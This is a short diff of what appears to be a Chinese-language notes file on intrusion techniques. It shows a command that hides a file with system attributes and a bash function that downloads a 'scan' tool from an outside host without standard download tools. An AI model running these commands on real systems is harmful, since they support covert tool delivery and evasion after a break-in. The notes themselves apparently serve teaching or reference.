@@ -312,6 +312,7 @@ reg query HKLM\SOFTWARE\Classes\.tudf /s
 
 attrib +h +s "Server.dat"
 ```
+```
 function DOWNLOAD() {
   url=$1
   proto="http://"
@@ -334,6 +335,7 @@ function DOWNLOAD() {
   done <&3
   exec 3>&-
 }
+```
 DOWNLOAD http://g.com:80/scan >scan
 
 # 小结
